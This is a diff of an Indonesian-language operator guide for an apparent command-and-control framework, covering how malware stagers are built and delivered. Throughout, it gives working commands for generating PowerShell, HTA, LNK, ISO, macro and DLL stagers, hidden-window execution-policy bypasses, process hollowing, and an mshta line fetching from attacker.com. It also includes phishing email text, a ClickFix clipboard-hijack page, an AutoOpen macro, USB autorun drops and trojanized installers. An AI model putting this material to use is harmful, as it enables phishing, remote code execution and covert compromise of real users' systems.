@@ -1,293 +1,302 @@
 # 09 — Stager & Delivery
 
-> Lihat [docs/DELIVERY_GUIDE.md](../docs/DELIVERY_GUIDE.md) untuk panduan delivery
-> per format yang sangat lengkap. Halaman ini adalah ringkasan dan cheatsheet.
+## Konsep Staged vs Stageless
+
+| Mode | Deskripsi | Ukuran | Kapan Dipakai |
+|------|-----------|--------|---------------|
+| **Stageless** | Agent full di-embed langsung ke payload delivery | 8-10 MB | USB drop, direct exec, lab |
+| **Staged** | Stager kecil (loader) download agent dari C2 | 10-50 KB | Phishing, macro, jaringan terbatas |
+
+**Staged flow:**
+```
+Phishing email
+    │
+    ▼
+User klik → stager.exe/stager.ps1 (50KB)
+    │
+    │ HTTPS GET /stage/TOKEN
+    ▼
+C2 server mengirim agent terenkripsi
+    │
+    ▼
+Stager decrypt + reflective load agent ke memory
+    │
+    ▼
+Agent berjalan — tidak ada file agent di disk (fileless)
+```
 
 ---
 
-## Konsep Staged Delivery
+## Upload Agent ke Stage Server
 
-```
-STAGELESS                    STAGED
-──────────────────────────   ──────────────────────────────────────────
-Target                       Target
-  └─► [Agent 10MB]             └─► [Stager 2MB]
-      Langsung aktif                └─► Download dari C2
-                                        └─► [Agent 10MB, terenkripsi]
-                                            └─► Decrypt di memori
-                                                └─► Aktif
-```
-
-**Keuntungan staged:**
-- File yang dikirim ke target jauh lebih kecil
-- Agent tidak pernah menyentuh disk (fileless jika exec-method hollow)
-- Token one-shot: URL download hanya bisa digunakan sekali
-- Payload tersimpan terenkripsi di server
-
----
-
-## Workflow Wajib (Selalu Sama)
+Sebelum generate stager, upload agent ke stage server:
 
 ```bash
-# 1. Server sudah jalan
-ENCRYPTION_KEY=KEY ./bin/server --port 8000
-
-# 2. Build agent
-make agent-win-stealth C2_SERVER=http://IP:8000 ENC_KEY=KEY
-
-# 3. Upload agent → dapat TOKEN
 ./bin/operator stage upload ./bin/agent_windows_stealth.exe \
-  --server http://IP:8000 --format exe --arch amd64 --ttl 48
+  --server https://c2.corp.local:8000 \
+  --format exe \
+  --arch amd64 \
+  --ttl 48 \
+  --desc "engagement-phase1"
+```
 
-# 4. Generate stager (pilih format)
-go run ./cmd/generate stager \
-  --server http://IP:8000 \
-  --token TOKEN \
-  --key KEY \
-  --format FORMAT \
-  --output output_file
+**Output:**
+```
+[+] Uploading agent (8.4 MB)...
+[+] Stage registered.
+
+    Token    : 6a69a21a750af40e983cf257b3d2e4a9
+    URL      : https://c2.corp.local:8000/stage/6a69a21a750af40e983cf257b3d2e4a9
+    Format   : exe (amd64)
+    TTL      : 48 hours → expires 2026-04-25 09:15:00 UTC
+    Desc     : engagement-phase1
+
+[i] Token dapat dipakai sekali saja (one-time download).
+```
+
+### Parameter Upload
+
+| Flag | Default | Keterangan |
+|------|---------|------------|
+| `--format` | `exe` | `exe`, `dll`, `shellcode` |
+| `--arch` | `amd64` | `amd64`, `386` |
+| `--ttl` | `24` | Jam sebelum token expired |
+| `--desc` | kosong | Label untuk identifikasi |
+
+### List Stage yang Tersedia
+
+```bash
+./bin/operator stage list --server https://c2.corp.local:8000
+```
+
+**Output:**
+```
+[+] Active stages:
+
+TOKEN           FORMAT   ARCH   TTL     DESC
+6a69a21a...     exe      amd64  46h23m  engagement-phase1
+b2c3d4e5...     dll      amd64  23h45m  engagement-phase2-dll
 ```
 
 ---
 
-## Format Stager
+## Generate Stager
 
-### `ps1` — PowerShell Drop (Paling Sering Dipakai)
+### Format PowerShell (.ps1)
 
 ```bash
 go run ./cmd/generate stager \
-  --server http://172.23.0.118:8000 \
-  --token TOKEN \
-  --key KEY \
+  --server https://c2.corp.local:8000 \
+  --token 6a69a21a750af40e983cf257b3d2e4a9 \
+  --key EnterpriseC2Key2026 \
   --format ps1 \
-  --exec-method drop \
   --output stager.ps1
 ```
 
-**Cara eksekusi di target:**
+**Output:**
+```
+[+] Stager written: stager.ps1 (2.1 KB)
+```
+
+**Cara eksekusi:**
 ```powershell
-# File langsung
-powershell -ep bypass -f stager.ps1
+# Dari PowerShell (butuh bypass execution policy)
+powershell -ExecutionPolicy Bypass -File stager.ps1
 
-# One-liner encoded (untuk ClickFix/phishing)
-powershell -w hidden -ep bypass -enc BASE64_DARI_PS1
+# One-liner (encode dulu untuk bypass)
+$b64 = [System.Convert]::ToBase64String([IO.File]::ReadAllBytes("stager.ps1"))
+powershell -w hidden -ep bypass -enc $b64
+
+# Dari command prompt
+powershell -w hidden -ep bypass -f stager.ps1
 ```
+
+**Isi stager.ps1 (konseptual):**
+```powershell
+$url = "https://c2.corp.local:8000/stage/TOKEN"
+$key = [System.Convert]::FromBase64String("KEY_B64")
+$r   = [System.Net.WebRequest]::Create($url)
+$r.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+$data = $r.GetResponse().GetResponseStream() | % { ... }
+# Decrypt AES-GCM
+# Reflective load ke memory
+[Reflection.Assembly]::Load($agent_bytes)
+```
+
+### Format Batch (.bat)
+
+```bash
+go run ./cmd/generate stager --format bat --output stager.bat ...
+```
+
+**Cara eksekusi:**
+```cmd
+# Klik dua kali atau jalankan dari cmd
+stager.bat
+
+# Dari command prompt
+cmd /c stager.bat
+```
+
+### Format HTA (HTML Application)
+
+```bash
+go run ./cmd/generate stager --format hta --output stager.hta ...
+```
+
+**Cara eksekusi:**
+```
+# Double klik dari Windows Explorer → dialog konfirmasi muncul → klik "Run"
+# Atau dari cmd:
+mshta.exe stager.hta
+
+# Atau via URL (hosting di web server):
+mshta.exe http://attacker.com/stager.hta
+```
+
+**OPSEC note:** HTA menampilkan dialog keamanan di Windows 10+.
+Untuk bypass dialog, gunakan ClickFix social engineering (user diminta copy-paste command).
+
+### Format LNK (Windows Shortcut)
+
+```bash
+go run ./cmd/generate stager --format lnk --output "Microsoft Edge.lnk" ...
+```
+
+LNK bisa di-embed dalam ZIP/ISO yang dikirim via email.
+
+**Target shortcut yang dibuat:**
+```
+Target: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Arguments: -w hidden -ep bypass -enc BASE64_STAGER
+Icon: %ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe,0
+```
+
+### Format ISO
+
+```bash
+go run ./cmd/generate stager --format iso --output delivery.iso ...
+```
+
+ISO berisi:
+```
+delivery.iso
+├── Microsoft Edge (Double Click to Open).lnk  ← shortcut ke stager
+└── setup.exe                                  ← decoy file
+```
+
+User mount ISO → klik shortcut → stager jalan.
+
+### Format EXE (Stageless Dropper)
+
+```bash
+go run ./cmd/generate stager --format exe --output setup.exe ...
+```
+
+Binary EXE yang langsung embed stager code.
 
 ---
 
-### `ps1-mem` — PowerShell In-Memory (Fileless)
+## Delivery Methods
 
-Butuh stage berisi **shellcode** (bukan EXE). Konversi dulu dengan donut:
+### 1. Phishing Email (Attachment)
+
+Kirim `stager.ps1` atau ISO/ZIP via email phishing:
+
+```
+Subject: Urgent: Update Your VPN Certificate
+Body   : Your VPN certificate needs to be updated. 
+         Please run the attached tool to update it.
+Attach : VPN_Certificate_Update.lnk  (LNK ke stager)
+```
+
+### 2. ClickFix (No-Attachment Phishing)
+
+Tampilkan halaman web dengan instruksi "copy-paste command untuk fix error":
+
+```html
+<!-- Halaman phishing -->
+<script>
+  navigator.clipboard.writeText(
+    'powershell -w hidden -ep bypass -enc BASE64_STAGER_HERE'
+  );
+</script>
+<p>Error detected! Press Win+R, type "powershell" and press Enter,
+   then paste the command (Ctrl+V) and press Enter to fix.</p>
+```
+
+### 3. Macro Word/Excel
+
+```vba
+' AutoOpen macro di Word/Excel
+Sub AutoOpen()
+    Shell "powershell -w hidden -ep bypass -enc BASE64_STAGER"
+End Sub
+```
+
+### 4. USB Drop
 
 ```bash
-donut -i bin/agent_windows_stealth.exe -o agent.bin -a 2
+# Salin agent stealth ke USB
+cp bin/agent_windows_stealth.exe /media/usb/SystemUpdate.exe
 
-./bin/operator stage upload agent.bin \
-  --server http://172.23.0.118:8000 --format shellcode
-
-go run ./cmd/generate stager \
-  --server http://172.23.0.118:8000 \
-  --token TOKEN_SHELLCODE \
-  --key KEY \
-  --format ps1-mem \
-  --output stager_mem.ps1
+# Atau buat autorun (legacy systems)
+echo "[AutoRun]" > /media/usb/autorun.inf
+echo "open=SystemUpdate.exe" >> /media/usb/autorun.inf
 ```
 
----
+### 5. Supply Chain / Trojanized Installer
 
-### `exe` — Binary Stager
+Inject agent ke installer legitimate menggunakan resource patcher:
 
 ```bash
-go run ./cmd/generate stager \
-  --server http://172.23.0.118:8000 \
-  --token TOKEN \
-  --key KEY \
-  --format exe \
-  --exec-method drop \
-  --output stager.exe
-```
-
-**Exec method untuk EXE:**
-- `drop` → download ke `%TEMP%`, eksekusi langsung
-- `hollow` → spawn svchost.exe suspended, hollow dengan agent
-- `thread` → VirtualAlloc + CreateThread (butuh shellcode)
-
-```bash
-# Dengan process hollowing ke RuntimeBroker
-go run ./cmd/generate stager \
-  --format exe \
-  --exec-method hollow \
-  --hollow-exe "C:\Windows\System32\RuntimeBroker.exe" \
-  --output stager_hollow.exe
-```
-
----
-
-### `hta` — HTML Application
-
-```bash
-go run ./cmd/generate stager \
-  --server http://172.23.0.118:8000 \
-  --token TOKEN \
-  --key KEY \
-  --format hta \
-  --output update.hta
-```
-
-**Cara eksekusi di target:**
-```
-Dobel-klik update.hta → mshta.exe → VBScript → stager
-```
-
-Atau via command line:
-```
-mshta.exe http://172.23.0.118:8888/update.hta
-```
-
----
-
-### `vba` — Office Macro
-
-```bash
-go run ./cmd/generate stager \
-  --server http://172.23.0.118:8000 \
-  --token TOKEN \
-  --key KEY \
-  --format vba \
-  --output macro.bas
-```
-
-**Deploy ke Word/Excel:**
-1. `Alt+F11` → Insert Module → Paste `macro.bas`
-2. Simpan sebagai `.docm` / `.xlsm`
-3. Target buka → Enable Content → auto-eksekusi
-
----
-
-### `dll` — DLL Sideloading
-
-```bash
-go run ./cmd/generate stager \
-  --server http://172.23.0.118:8000 \
-  --token TOKEN \
-  --key KEY \
-  --format dll \
-  --output version.dll
-```
-
-Letakkan di folder aplikasi yang load `version.dll` → saat app dibuka, DllMain dipanggil.
-
----
-
-## Delivery Templates
-
-Template untuk social engineering — tidak perlu compile ulang.
-
-### ClickFix (Win+R Lure)
-
-```bash
-go run ./cmd/generate template \
-  --type clickfix \
-  --stager-file bin/agent_windows_stealth.exe \
-  --lure "Human Verification Required" \
-  --output lure.html
-```
-
-Host di web server → kirim link ke target → target tekan Win+R dan paste perintah.
-
-### LNK — Windows Shortcut
-
-```bash
-go run ./cmd/generate template \
-  --type lnk \
-  --url http://172.23.0.118:8000/stage/TOKEN \
-  --lure "Laporan_Q1_2026" \
-  --output make_lnk.ps1
-
-# Jalankan PS1 di mesin attacker untuk generate .lnk
-powershell -f make_lnk.ps1
-```
-
-### ISO Bundle
-
-```bash
-go run ./cmd/generate template \
-  --type iso \
-  --url http://172.23.0.118:8000/stage/TOKEN \
-  --lure "Dokumen_Kontrak" \
-  --output iso_recipe.txt
-
-# Buat ISO di Linux
-mkdir iso_contents && cp stager.exe iso_contents/
-mkisofs -o lure.iso -J -R -l iso_contents/
-```
-
-### HTA Template
-
-```bash
-go run ./cmd/generate template \
-  --type hta \
-  --url http://172.23.0.118:8000/stage/TOKEN \
-  --output phish.hta
-```
-
-### Office VBA Template
-
-```bash
-go run ./cmd/generate template \
-  --type macro \
-  --url http://172.23.0.118:8000/stage/TOKEN \
-  --output macro.bas
+# Konseptual — tidak ada built-in support
+# Gunakan tools seperti: ResourceHacker, Peshield, InjectPE
 ```
 
 ---
 
 ## Stage Management
 
-```
-# Lihat semua stage
-./bin/operator stage list --server http://IP:8000
-
-# Output:
-# TOKEN                              FORMAT  ARCH    USED    EXP        DESCRIPTION
-# 6a69a21a750af40e983cf257b3d2e4a9  exe     amd64   no      24h        test-engagement
-
-# Hapus stage
-./bin/operator stage delete TOKEN --server http://IP:8000
-```
-
----
-
-## Anti-Sandbox Delay
+### Hapus Stage (Token Invalidation)
 
 ```bash
-# Tambah delay N detik sebelum eksekusi (bypass sandbox timeout)
-go run ./cmd/generate stager \
-  --format ps1 \
-  --jitter 15 \
-  --token TOKEN \
-  --key KEY \
-  --output stager.ps1
+./bin/operator stage delete TOKEN --server https://c2.corp.local:8000
+# [+] Stage TOKEN deleted. URL tidak bisa diakses lagi.
+```
+
+### Lihat Berapa Kali Didownload
+
+```bash
+./bin/operator stage info TOKEN --server https://c2.corp.local:8000
+```
+
+**Output:**
+```
+[+] Stage info:
+
+    Token     : 6a69a21a...
+    Format    : exe (amd64)
+    Size      : 8,421,376 bytes
+    Downloads : 1 (one-time token → now invalid)
+    Created   : 2026-04-23 09:15:00 UTC
+    Expires   : 2026-04-25 09:15:00 UTC
+    Desc      : engagement-phase1
 ```
 
 ---
 
-## Decision: Pilih Format
+## OPSEC untuk Stager
 
-```
-Delivery via?
-├── Email attachment
-│   ├── Target buka Office  → vba
-│   ├── Semua file           → hta atau exe dalam .zip
-│   └── Gateway ketat        → iso dalam .zip
-├── Link web / ClickFix      → ps1 via clickfix template
-├── USB drop                 → exe atau iso+lnk
-├── Shell sudah ada          → ps1 langsung
-└── Target ada EDR?
-    ├── AV saja              → ps1 + hollow
-    ├── EDR aktif            → dll sideload atau ps1-mem
-    └── Memory scan          → custom loader
-```
+**Gunakan HTTPS:** Stager yang mendownload via HTTP bisa di-intercept.
+
+**TTL minimal:** Set TTL sesuai kebutuhan (bukan 24h jika hanya butuh 1 jam).
+
+**One-time token:** Token default hanya bisa didownload sekali — agent delivery URL
+yang sama tidak bisa dipakai dua kali (cegah replay oleh defender).
+
+**User-Agent:** Stager menggunakan User-Agent browser legitimate untuk hindari
+deteksi proxy yang filter UA aneh.
 
 ---
 
